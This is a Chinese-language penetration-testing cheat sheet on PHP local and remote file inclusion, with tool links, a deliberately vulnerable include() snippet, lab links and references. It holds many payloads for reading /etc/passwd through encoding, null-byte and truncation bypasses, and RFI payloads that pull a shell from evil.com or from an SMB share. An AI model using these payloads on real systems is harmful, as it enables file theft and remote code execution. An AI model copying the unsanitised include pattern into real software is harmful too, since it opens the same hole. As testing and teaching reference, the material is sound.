[原文文档](README.en.md)

# 文件包含

> 文件包含漏洞是指Web应用程序中的一种安全漏洞，在PHP等语言开发的应用程序中特别常见，攻击者可以包含一个文件，通常是利用缺乏适当的输入/输出清理。这个漏洞可能导致各种恶意活动，包括代码执行、数据窃取和网站篡改。

## 摘要

- [工具](#工具)
- [本地文件包含](#本地文件包含)
    - [空字节](#空字节)
    - [双重编码](#双重编码)
    - [UTF-8编码](#utf-8编码)
    - [路径截断](#路径截断)
    - [过滤器绕过](#过滤器绕过)
- [远程文件包含](#远程文件包含)
    - [空字节](#空字节-1)
    - [双重编码](#双重编码-1)
    - [绕过allow_url_include](#绕过allow_url_include)
- [实验环境](#实验环境)
- [参考](#参考)

## 工具

- [P0cL4bs/Kadimus](https://github.com/P0cL4bs/Kadimus) (于2020年10月7日存档) - kadimus是一个检查和利用LFI漏洞的工具。
- [D35m0nd142/LFISuite](https://github.com/D35m0nd142/LFISuite) - 全自动LFI利用器（+反向Shell）和扫描器
- [kurobeats/fimap](https://github.com/kurobeats/fimap) - fimap是一个小型Python工具，可以自动查找、准备、审计、利用甚至谷歌搜索Web应用程序中的本地和远程文件包含漏洞。
- [lightos/Panoptic](https://github.com/lightos/Panoptic) - Panoptic是一个开源渗透测试工具，通过路径遍历漏洞自动搜索和检索常见日志和配置文件的内容。
- [hansmach1ne/LFImap](https://github.com/hansmach1ne/LFImap) - 本地文件包含发现和利用工具

## 本地文件包含

**文件包含漏洞**应与**路径遍历**区分开来。路径遍历漏洞允许攻击者访问文件，通常是利用目标应用程序中实现的"读取"机制，而文件包含将导致任意代码的执行。

考虑一个基于用户输入包含文件的PHP脚本。如果没有适当的清理，攻击者可以操纵`page`参数来包含本地或远程文件，导致未授权访问或代码执行。

```php
<?php
$file = $_GET['page'];
include($file);
?>
```

在下面的例子中，我们包含`/etc/passwd`文件，更多有趣的文件请查看`目录和路径遍历`章节。

```powershell
http://example.com/index.php?page=../../../etc/passwd
```

### 空字节

:warning: 在低于5.3.4版本的PHP中，我们可以用空字节（`%00`）终止。

```powershell
http://example.com/index.php?page=../../../etc/passwd%00
```

**示例**: Joomla! Component Web TV 1.0 - CVE-2010-1470

```ps1
{{BaseURL}}/index.php?option=com_webtv&controller=../../../../../../../../../../etc/passwd%00
```

### 双重编码

```powershell
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

### UTF-8编码

```powershell
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
```

### 路径截断

在大多数PHP安装中，长度超过`4096`字节的文件名会被截断，所以任何多余的字符都会被丢弃。

```powershell
http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE] 
http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd
```

### 过滤器绕过

```powershell
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
```

## 远程文件包含

> 远程文件包含（RFI）是一种漏洞，当应用程序通过用户输入包含远程文件时，没有适当验证或清理输入时就会发生这种漏洞。

由于`allow_url_include`自PHP 5以来已被禁用，远程文件包含在默认配置下不再有效。

```ini
allow_url_include = On
```

LFI部分的大多数过滤器绕过技术可以重复用于RFI。

```powershell
http://example.com/index.php?page=http://evil.com/shell.txt
```

### 空字节

```powershell
http://example.com/index.php?page=http://evil.com/shell.txt%00
```

### 双重编码

```powershell
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
```

### 绕过allow_url_include

当`allow_url_include`和`allow_url_fopen`设置为`Off`时。在Windows系统上使用`smb`协议仍然可以包含远程文件。

1. 创建一个对所有人开放的共享
2. 在文件中写入PHP代码：`shell.php`
3. 包含它 `http://example.com/index.php?page=\\10.0.0.1\share\shell.php`

## 实验环境

- [Root Me - 本地文件包含](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion)
- [Root Me - 本地文件包含 - 双重编码](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Double-encoding)
- [Root Me - 远程文件包含](https://www.root-me.org/en/Challenges/Web-Server/Remote-File-Inclusion)
- [Root Me - PHP - 过滤器](https://www.root-me.org/en/Challenges/Web-Server/PHP-Filters)

## 参考

- [CVV #1: 本地文件包含 - SI9INT - 2018年6月20日](https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a)
- [在PHP应用程序中利用远程文件包含（RFI）并绕过远程URL包含限制 - Mannu Linux - 2019年5月12日](http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html)
- [PHP是否易受攻击，在什么条件下？ - 2015年4月13日 - Andreas Venieris](http://0x191unauthorized.blogspot.fr/2015/04/is-php-vulnerable-and-under-what.html)
- [LFI备忘单 - @Arr0way - 2016年4月24日](https://highon.coffee/blog/lfi-cheat-sheet/)
- [测试本地文件包含 - OWASP - 2017年6月25日](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion)
- [将LFI转换为RFI - Grayson Christopher - 2017年8月14日](https://web.archive.org/web/20170815004721/https://l.avala.mp/?p=241)